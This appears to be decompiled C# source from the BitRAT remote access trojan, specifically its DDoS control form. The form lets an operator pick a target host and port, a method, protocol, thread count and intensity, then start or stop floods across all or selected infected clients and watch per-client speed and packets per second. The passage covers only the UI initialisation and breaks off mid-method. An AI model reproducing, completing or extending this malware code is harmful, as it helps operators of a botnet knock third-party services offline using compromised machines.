﻿using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fDDOS : Form
{
    private IContainer icontainer_0;
    private VisualButton visualButton_0;
    private VisualButton visualButton_1;
    private BackgroundWorker backgroundWorker_0;
    private ComboBox comboBox_0;
    private Label label_0;
    private ComboBox comboBox_1;
    private Label label_1;
    private TextBox textBox_0;
    private Label label_2;
    private TextBox textBox_1;
    private Label label_3;
    private RadioButton radioButton_0;
    private RadioButton radioButton_1;
    private Timer timer_0;
    private StatusStrip statusStrip_0;
    private ToolStripStatusLabel toolStripStatusLabel_0;
    private ToolStripStatusLabel toolStripStatusLabel_1;
    private ToolStripStatusLabel toolStripStatusLabel_2;
    private ToolStripStatusLabel toolStripStatusLabel_3;
    private FastObjectListView fastObjectListView_0;
    private OLVColumn olvcolumn_0;
    private OLVColumn olvcolumn_1;
    private OLVColumn olvcolumn_2;
    private OLVColumn olvcolumn_3;
    private OLVColumn olvcolumn_4;
    private OLVColumn olvcolumn_5;
    private OLVColumn olvcolumn_6;
    private OLVColumn olvcolumn_7;
    private OLVColumn olvcolumn_8;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripMenuItem toolStripMenuItem_3;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_4;
    private OLVColumn olvcolumn_9;
    private ComboBox comboBox_2;
    private Label label_4;
    private Label label_5;
    private TextBox textBox_2;
    private PictureBox pictureBox_0;
    private ComboBox comboBox_3;
    private Label label_6;
    private PictureBox pictureBox_1;
    private Label label_7;
    private TextBox textBox_3;
    private Label label_8;
    private PictureBox pictureBox_2;
    private OLVColumn olvcolumn_10;
    private OLVColumn olvcolumn_11;
    private OLVColumn olvcolumn_12;
    private ToolStripStatusLabel toolStripStatusLabel_4;
    public ConcurrentStack<cDOScli> concurrentStack_0;
    public ConcurrentStack<cDOScli> concurrentStack_1;
    public ConcurrentStack<cDOScli> concurrentStack_2;
    private double double_0;
    private double double_1;
    private double double_2;

    public fDDOS()
    {
        base.Load += new EventHandler(this.fDDOS_Load);
        base.Closing += new CancelEventHandler(this.fDDOS_Closing);
        this.concurrentStack_0 = new ConcurrentStack<cDOScli>();
        this.concurrentStack_1 = new ConcurrentStack<cDOScli>();
        this.concurrentStack_2 = new ConcurrentStack<cDOScli>();
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fDDOS_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fDDOS_Load(object sender, EventArgs e)
    {
        this.method_8();
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_1(new VisualButton());
        this.vmethod_3(new VisualButton());
        this.vmethod_5(new BackgroundWorker());
        this.vmethod_7(new ComboBox());
        this.vmethod_9(new Label());
        this.vmethod_11(new ComboBox());
        this.vmethod_13(new Label());
        this.vmethod_15(new TextBox());
        this.vmethod_17(new Label());
        this.vmethod_19(new TextBox());
        this.vmethod_21(new Label());
        this.vmethod_23(new RadioButton());
        this.vmethod_25(new RadioButton());
        this.vmethod_27(new Timer(this.icontainer_0));
        this.vmethod_29(new StatusStrip());
        this.vmethod_31(new ToolStripStatusLabel());
        this.vmethod_107(new ToolStripStatusLabel());
        this.vmethod_33(new ToolStripStatusLabel());
        this.vmethod_35(new ToolStripStatusLabel());
        this.vmethod_37(new ToolStripStatusLabel());
        this.vmethod_39(new FastObjectListView());
        this.vmethod_41(new OLVColumn());
        this.vmethod_45(new OLVColumn());
        this.vmethod_47(new OLVColumn());
        this.vmethod_49(new OLVColumn());
        this.vmethod_51(new OLVColumn());
        this.vmethod_43(new OLVColumn());
        this.vmethod_105(new OLVColumn());
        this.vmethod_53(new OLVColumn());
        this.vmethod_55(new OLVColumn());
        this.vmethod_75(new OLVColumn());
        this.vmethod_103(new OLVColumn());
        this.vmethod_101(new OLVColumn());
        this.vmethod_57(new OLVColumn());
        this.vmethod_59(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_61(new ToolStripMenuItem());
        this.vmethod_63(new ToolStripMenuItem());
        this.vmethod_65(new ToolStripSeparator());
        this.vmethod_67(new ToolStripMenuItem());
        this.vmethod_69(new ToolStripMenuItem());
        this.vmethod_71(new ToolStripSeparator());
        this.vmethod_73(new ToolStripMenuItem());
        this.vmethod_77(new ComboBox());
        this.vmethod_79(new Label());
        this.vmethod_81(new Label());
        this.vmethod_83(new TextBox());
        this.vmethod_85(new PictureBox());
        this.vmethod_87(new ComboBox());
        this.vmethod_89(new Label());
        this.vmethod_91(new PictureBox());
        this.vmethod_93(new Label());
        this.vmethod_95(new TextBox());
        this.vmethod_97(new Label());
        this.vmethod_99(new PictureBox());
        this.vmethod_28().SuspendLayout();
        this.vmethod_38().BeginInit();
        this.vmethod_58().SuspendLayout();
        ((ISupportInitialize) this.vmethod_84()).BeginInit();
        ((ISupportInitialize) this.vmethod_90()).BeginInit();
        ((ISupportInitialize) this.vmethod_98()).BeginInit();
        base.SuspendLayout();
        this.vmethod_0().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_0().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_0().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_0().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_0().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_0().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_0().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_0().Border.HoverVisible = true;
        this.vmethod_0().Border.Rounding = 6;
        this.vmethod_0().Border.Thickness = 1;
        this.vmethod_0().Border.Type = ShapeTypes.Rounded;
        this.vmethod_0().Border.Visible = true;
        this.vmethod_0().DialogResult = DialogResult.None;
        this.vmethod_0().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_0().Image = null;
        this.vmethod_0().Location = new Point(0x4b, 0x1ab);
        this.vmethod_0().MouseState = MouseStates.Normal;
        this.vmethod_0().Name = "btnStop";
        this.vmethod_0().Size = new Size(0x3d, 30);
        this.vmethod_0().TabIndex = 0x7c;
        this.vmethod_0().Text = "Stop";
        this.vmethod_0().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_0().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_0().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_0().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_0().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_0().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_0().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_0().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_2().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_2().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_2().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_2().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_2().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_2().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_2().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_2().Border.HoverVisible = true;
        this.vmethod_2().Border.Rounding = 6;
        this.vmethod_2().Border.Thickness = 1;
        this.vmethod_2().Border.Type = ShapeTypes.Rounded;
        this.vmethod_2().Border.Visible = true;
        this.vmethod_2().DialogResult = DialogResult.None;
        this.vmethod_2().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_2().Image = null;
        this.vmethod_2().Location = new Point(8, 0x1ab);
        this.vmethod_2().MouseState = MouseStates.Normal;
        this.vmethod_2().Name = "btnStart";
        this.vmethod_2().Size = new Size(0x3d, 30);
        this.vmethod_2().TabIndex = 0x7b;
        this.vmethod_2().Text = "Start";
        this.vmethod_2().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_2().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_2().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_2().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_2().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_6().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_6().BackColor = Color.White;
        this.vmethod_6().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_6().ForeColor = Color.Black;
        this.vmethod_6().FormattingEnabled = true;
        this.vmethod_6().ImeMode = ImeMode.NoControl;
        this.vmethod_6().Location = new Point(0x25b, 0x1a7);
        this.vmethod_6().Margin = new Padding(2);
        this.vmethod_6().Name = "cbThreads";
        this.vmethod_6().Size = new Size(0x49, 0x15);
        this.vmethod_6().TabIndex = 0x6b;
        this.vmethod_6().TabStop = false;
        this.vmethod_8().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_8().BackColor = Color.Transparent;
        this.vmethod_8().Location = new Point(0x222, 0x1ab);
        this.vmethod_8().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_8().Name = "lblThreads";
        this.vmethod_8().Size = new Size(0x35, 13);
        this.vmethod_8().TabIndex = 0x6a;
        this.vmethod_8().Text = "Threads:";
        this.vmethod_8().TextAlign = ContentAlignment.TopRight;
        this.vmethod_10().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_10().BackColor = Color.White;
        this.vmethod_10().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_10().ForeColor = Color.Black;
        this.vmethod_10().FormattingEnabled = true;
        this.vmethod_10().ImeMode = ImeMode.NoControl;
        this.vmethod_10().Location = new Point(0x195, 0x1a7);
        this.vmethod_10().Margin = new Padding(2);
        this.vmethod_10().Name = "cbMethod";
        this.vmethod_10().Size = new Size(0x76, 0x15);
        this.vmethod_10().TabIndex = 0x69;
        this.vmethod_10().TabStop = false;
        this.vmethod_12().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_12().BackColor = Color.Transparent;
        this.vmethod_12().Location = new Point(0x163, 0x1ab);
        this.vmethod_12().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_12().Name = "lblMethod";
        this.vmethod_12().Size = new Size(0x2e, 13);
        this.vmethod_12().TabIndex = 0x68;
        this.vmethod_12().Text = "Method:";
        this.vmethod_12().TextAlign = ContentAlignment.TopRight;
        this.vmethod_14().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_14().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_14().ForeColor = Color.Gray;
        this.vmethod_14().Location = new Point(0xd0, 0x1c1);
        this.vmethod_14().Margin = new Padding(2);
        this.vmethod_14().MaxLength = 5;
        this.vmethod_14().Name = "txtPort";
        this.vmethod_14().Size = new Size(0x45, 20);
        this.vmethod_14().TabIndex = 0x67;
        this.vmethod_14().Text = "12345";
        this.vmethod_16().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_16().BackColor = Color.Transparent;
        this.vmethod_16().Location = new Point(0xac, 0x1c5);
        this.vmethod_16().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_16().Name = "lblUsername";
        this.vmethod_16().Size = new Size(0x20, 13);
        this.vmethod_16().TabIndex = 0x66;
        this.vmethod_16().Text = "Port:";
        this.vmethod_16().TextAlign = ContentAlignment.TopRight;
        this.vmethod_18().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_18().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_18().ForeColor = Color.Gray;
        this.vmethod_18().Location = new Point(0xd0, 0x1aa);
        this.vmethod_18().Margin = new Padding(2);
        this.vmethod_18().MaxLength = 0x2d;
        this.vmethod_18().Name = "txtTarget";
        this.vmethod_18().Size = new Size(0x8a, 20);
        this.vmethod_18().TabIndex = 0x65;
        this.vmethod_18().Text = "Target IP or DNS";
        this.vmethod_20().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_20().BackColor = Color.Transparent;
        this.vmethod_20().Location = new Point(0x93, 0x1ad);
        this.vmethod_20().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_20().Name = "lblTarget";
        this.vmethod_20().Size = new Size(0x39, 13);
        this.vmethod_20().TabIndex = 100;
        this.vmethod_20().Text = "Target:";
        this.vmethod_20().TextAlign = ContentAlignment.TopRight;
        this.vmethod_22().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_22().AutoSize = true;
        this.vmethod_22().BackColor = Color.Transparent;
        this.vmethod_22().Location = new Point(0x2e, 0x1cb);
        this.vmethod_22().Margin = new Padding(2);
        this.vmethod_22().Name = "rbSelected";
        this.vmethod_22().Size = new Size(0x7a, 0x11);
        this.vmethod_22().TabIndex = 0x63;
        this.vmethod_22().Text = "Only selected clients";
        this.vmethod_22().UseVisualStyleBackColor = false;
        this.vmethod_24().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_24().AutoSize = true;
        this.vmethod_24().BackColor = Color.Transparent;
        this.vmethod_24().Checked = true;
        this.vmethod_24().Location = new Point(8, 0x1cb);
        this.vmethod_24().Margin = new Padding(2);
        this.vmethod_24().Name = "rbAll";
        this.vmethod_24().Size = new Size(0x24, 0x11);
        this.vmethod_24().TabIndex = 0x62;
        this.vmethod_24().TabStop = true;
        this.vmethod_24().Text = "All";
        this.vmethod_24().UseVisualStyleBackColor = false;
        this.vmethod_26().Enabled = true;
        this.vmethod_26().Interval = 0x3e8;
        this.vmethod_28().AutoSize = false;
        this.vmethod_28().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_28().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_30(), this.vmethod_106(), this.vmethod_32(), this.vmethod_34(), this.vmethod_36() };
        this.vmethod_28().Items.AddRange(toolStripItems);
        this.vmethod_28().Location = new Point(0, 0x1e2);
        this.vmethod_28().Name = "ssDDOSStatus";
        this.vmethod_28().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_28().Size = new Size(0x476, 0x13);
        this.vmethod_28().SizingGrip = false;
        this.vmethod_28().Stretch = false;
        this.vmethod_28().TabIndex = 0x61;
        this.vmethod_28().Text = "stStatus";
        this.vmethod_30().AutoSize = false;
        this.vmethod_30().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_30().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_30().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_30().Name = "tsDOSClientsCount";
        this.vmethod_30().Size = new Size(140, 0x10);
        this.vmethod_30().Text = "DDoS clients: 0";
        this.vmethod_30().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_106().AutoSize = false;
        this.vmethod_106().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_106().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_106().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_106().Name = "tsDDoSThreads";
        this.vmethod_106().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_106().Size = new Size(180, 0x10);
        this.vmethod_106().Text = "Threads: N/A";
        this.vmethod_106().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_32().AutoSize = false;
        this.vmethod_32().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_32().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_32().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_32().Name = "tsDOSSpeed";
        this.vmethod_32().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_32().Size = new Size(180, 0x10);
        this.vmethod_32().Text = "Speed: N/A";
        this.vmethod_32().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_34().AutoSize = false;
        this.vmethod_34().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_34().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_34().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_34().Name = "tsDOSPPS";
        this.vmethod_34().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_34().Size = new Size(180, 0x10);
        this.vmethod_34().Text = "PPS: N/A";
        this.vmethod_34().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_36().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_36().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_36().Margin = new Padding(0, 3, -4, 0);
        this.vmethod_36().Name = "tsClientsSelected";
        this.vmethod_36().Size = new Size(0x1ca, 0x10);
        this.vmethod_36().Spring = true;
        this.vmethod_36().Text = "Selected clients: 0";
        this.vmethod_36().TextAlign = ContentAlignment.MiddleRight;
        this.vmethod_38().Alignment = ListViewAlignment.Left;
        this.vmethod_38().get_AllColumns().Add(this.vmethod_40());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_44());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_46());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_48());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_50());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_42());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_104());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_52());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_54());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_74());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_102());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_100());
        this.vmethod_38().get_AllColumns().Add(this.vmethod_56());
        this.vmethod_38().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_38().AutoArrange = false;
        this.vmethod_38().BorderStyle = BorderStyle.None;
        this.vmethod_38().set_CellEditUseWholeCell(false);
        ColumnHeader[] values = new ColumnHeader[13];
        values[0] = this.vmethod_40();
        values[1] = this.vmethod_44();
        values[2] = this.vmethod_46();
        values[3] = this.vmethod_48();
        values[4] = this.vmethod_50();
        values[5] = this.vmethod_42();
        values[6] = this.vmethod_104();
        values[7] = this.vmethod_52();
        values[8] = this.vmethod_54();
        values[9] = this.vmethod_74();
        values[10] = this.vmethod_102();
        values[11] = this.vmethod_100();
        values[12] = this.vmethod_56();
        this.vmethod_38().get_Columns().AddRange(values);
        this.vmethod_38().ContextMenuStrip = this.vmethod_58();
        this.vmethod_38().Cursor = Cursors.Default;
        this.vmethod_38().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_38().FullRowSelect = true;
        this.vmethod_38().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_38().HideSelection = false;
        this.vmethod_38().Location = new Point(0, 0);
        this.vmethod_38().Margin = new Padding(1);
        this.vmethod_38().Name = "lvDOSClients";
        this.vmethod_38().set_ShowGroups(false);
        this.vmethod_38().Size = new Size(0x476, 0x19c);
        this.vmethod_38().TabIndex = 0x60;
        this.vmethod_38().set_UseCellFormatEvents(true);
        this.vmethod_38().UseCompatibleStateImageBehavior = false;
        this.vmethod_38().set_UseHotControls(false);
        this.vmethod_38().set_UseOverlays(false);
        this.vmethod_38().set_View(View.Details);
        this.vmethod_38().VirtualMode = true;
        this.vmethod_40().set_AspectName("USER");
        this.vmethod_40().set_Hideable(false);
        this.vmethod_40().Text = "User";
        this.vmethod_44().set_AspectName("TARGET_HOST");
        this.vmethod_44().set_Hideable(false);
        this.vmethod_44().Text = "Target";
        this.vmethod_46().set_AspectName("TARGET_PORT");
        this.vmethod_46().set_Hideable(false);
        this.vmethod_46().Text = "Port";
        this.vmethod_48().set_AspectName("PROTOCOL");
        this.vmethod_48().set_Hideable(false);
        this.vmethod_48().Text = "Protocol";
        this.vmethod_50().set_AspectName("METHOD");
        this.vmethod_50().set_Hideable(false);
        this.vmethod_50().Text = "Method";
        this.vmethod_42().set_AspectName("THREADS");
        this.vmethod_42().set_Hideable(false);
        this.vmethod_42().Text = "Threads";
        this.vmethod_104().set_AspectName("BYTES_SENT");
        this.vmethod_104().set_Hideable(false);
        this.vmethod_104().Text = "Sent";
        this.vmethod_52().set_AspectName("SPEED");
        this.vmethod_52().set_Hideable(false);
        this.vmethod_52().Text = "Speed";
        this.vmethod_54().set_AspectName("PPS");
        this.vmethod_54().set_Hideable(false);
        this.vmethod_54().Text = "PPS";
        this.vmethod_74().set_AspectName("PACKET_SIZE");
        this.vmethod_74().set_Hideable(false);
        this.vmethod_74().Text = "Packet size";
        this.vmethod_102().set_AspectName("INTENSITY");
        this.vmethod_102().set_Hideable(false);
        this.vmethod_102().Text = "Intensity";
        this.vmethod_100().set_AspectName("STATUS");
        this.vmethod_100().set_Hideable(false);
        this.vmethod_100().Text = "Status";
        this.vmethod_56().set_AspectName("DURATION");
        this.vmethod_56().set_Hideable(false);
        this.vmethod_56().Text = "Duration";
        this.vmethod_58().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray2 = new ToolStripItem[] { this.vmethod_60(), this.vmethod_64(), this.vmethod_66() };
        this.vmethod_58().Items.AddRange(itemArray2);
        this.vmethod_58().Name = "ContextMenuStrip1";
        this.vmethod_58().Size = new Size(170, 0x36);
        ToolStripItem[] itemArray3 = new ToolStripItem[] { this.vmethod_62() };
        this.vmethod_60().DropDownItems.AddRange(itemArray3);
        this.vmethod_60().Name = "OperationsToolStripMenuItem";
        this.vmethod_60().Size = new Size(0xa9, 0x16);
        this.vmethod_60().Text = "Operations";
        this.vmethod_62().Name = "StopToolStripMenuItem";
        this.vmethod_62().Size = new Size(0x62, 0x16);
        this.vmethod_62().Text = "Stop";
        this.vmethod_64().Name = "ToolStripMenuItem2";
        this.vmethod_64().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray4 = new ToolStripItem[] { this.vmethod_68(), this.vmethod_70(), this.vmethod_72() };
        this.vmethod_66().DropDownItems.AddRange(itemArray4);
        this.vmethod_66().Name = "CopyToClipboardToolStripMenuItem";
        this.vmethod_66().Size = new Size(0xa9, 0x16);
        this.vmethod_66().Text = "Copy to clipboard";
        this.vmethod_68().Name = "SelectedToolStripMenuItem";
        this.vmethod_68().Size = new Size(0x76, 0x16);
        this.vmethod_68().Text = "Selected";
        this.vmethod_70().Name = "ToolStripMenuItem4";
        this.vmethod_70().Size = new Size(0x73, 6);
        this.vmethod_72().Name = "AllToolStripMenuItem";
        this.vmethod_72().Size = new Size(0x76, 0x16);
        this.vmethod_72().Text = "All";
        this.vmethod_76().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_76().BackColor = Color.White;
        this.vmethod_76().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_76().Enabled = false;
        this.vmethod_76().ForeColor = Color.Black;
        this.vmethod_76().FormattingEnabled = true;
        this.vmethod_76().ImeMode = ImeMode.NoControl;
        this.vmethod_76().Location = new Point(0x25b, 0x1c4);
        this.vmethod_76().Margin = new Padding(2);
        this.vmethod_76().Name = "cbProtocol";
        this.vmethod_76().Size = new Size(0x49, 0x15);
        this.vmethod_76().TabIndex = 0x7e;
        this.vmethod_76().TabStop = false;
        this.vmethod_78().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_78().BackColor = Color.Transparent;
        this.vmethod_78().Location = new Point(550, 0x1c8);
        this.vmethod_78().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_78().Name = "lblProto";
        this.vmethod_78().Size = new Size(0x31, 13);
        this.vmethod_78().TabIndex = 0x7d;
        this.vmethod_78().Text = "Protocol:";
        this.vmethod_78().TextAlign = ContentAlignment.TopRight;
        this.vmethod_80().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_80().BackColor = Color.Transparent;
        this.vmethod_80().Location = new Point(0x32d, 0x1a5);
        this.vmethod_80().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_80().Name = "lblData";
        this.vmethod_80().Size = new Size(0x22, 13);
        this.vmethod_80().TabIndex = 0x7f;
        this.vmethod_80().Text = "Data:";
        this.vmethod_80().TextAlign = ContentAlignment.TopRight;
        this.vmethod_82().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_82().Enabled = false;
        this.vmethod_82().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_82().ForeColor = Color.Gray;
        this.vmethod_82().Location = new Point(0x353, 0x1a5);
        this.vmethod_82().Margin = new Padding(2);
        this.vmethod_82().Multiline = true;
        this.vmethod_82().Name = "txtData";
        this.vmethod_82().Size = new Size(0x11b, 60);
        this.vmethod_82().TabIndex = 0x80;
        this.vmethod_82().Text = "/site.php?x=val1&y=val2";
        this.vmethod_84().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_84().Image = Class131.smethod_24();
        this.vmethod_84().Location = new Point(680, 0x1aa);
        this.vmethod_84().Margin = new Padding(2);
        this.vmethod_84().Name = "pbDDOSThreads";
        this.vmethod_84().Size = new Size(15, 15);
        this.vmethod_84().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_84().TabIndex = 0x81;
        this.vmethod_84().TabStop = false;
        this.vmethod_86().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_86().BackColor = Color.White;
        this.vmethod_86().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_86().ForeColor = Color.Black;
        this.vmethod_86().FormattingEnabled = true;
        this.vmethod_86().ImeMode = ImeMode.NoControl;
        this.vmethod_86().Location = new Point(0x195, 0x1c4);
        this.vmethod_86().Margin = new Padding(2);
        this.vmethod_86().Name = "cbIntensity";
        this.vmethod_86().Size = new Size(0x76, 0x15);
        this.vmethod_86().TabIndex = 0x83;
        this.vmethod_86().TabStop = false;
        this.vmethod_88().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_88().BackColor = Color.Transparent;
        this.vmethod_88().Location = new Point(0x15d, 0x1c8);
        this.vmethod_88().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_88().Name = "lblIntensity";
        this.vmethod_88().Size = new Size(0x34, 13);
        this.vmethod_88().TabIndex = 130;
        this.vmethod_88().Text = "Intensity:";
        this.vmethod_88().TextAlign = ContentAlignment.TopRight;
        this.vmethod_90().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_90().Image = Class131.smethod_24();
        this.vmethod_90().Location = new Point(0x20f, 0x1c6);
        this.vmethod_90().Margin = new Padding(2);
        this.vmethod_90().Name = "pbDDOSIntensity";
        this.vmethod_90().Size = new Size(15, 15);
        this.vmethod_90().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_90().TabIndex = 0x84;
        this.vmethod_90().TabStop = false;
        this.vmethod_92().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_92().BackColor = Color.Transparent;
        this.vmethod_92().Location = new Point(0x2ad, 0x1c8);
        this.vmethod_92().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_92().Name = "lblSize";
        this.vmethod_92().Size = new Size(0x21, 13);
        this.vmethod_92().TabIndex = 0x85;
        this.vmethod_92().Text = "Size:";
        this.vmethod_92().TextAlign = ContentAlignment.TopRight;
        this.vmethod_94().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_94().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_94().ForeColor = SystemColors.WindowText;
        this.vmethod_94().Location = new Point(0x2d2, 0x1c5);
        this.vmethod_94().Margin = new Padding(2);
        this.vmethod_94().MaxLength = 5;
        this.vmethod_94().Name = "txtSize";
        this.vmethod_94().Size = new Size(0x3b, 20);
        this.vmethod_94().TabIndex = 0x86;
        this.vmethod_94().Text = "0";
        this.vmethod_96().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_96().BackColor = Color.Transparent;
        this.vmethod_96().Location = new Point(0x30f, 0x1c8);
        this.vmethod_96().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_96().Name = "lblSizeKB";
        this.vmethod_96().Size = new Size(40, 13);
        this.vmethod_96().TabIndex = 0x87;
        this.vmethod_96().Text = "Bytes";
        this.vmethod_98().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
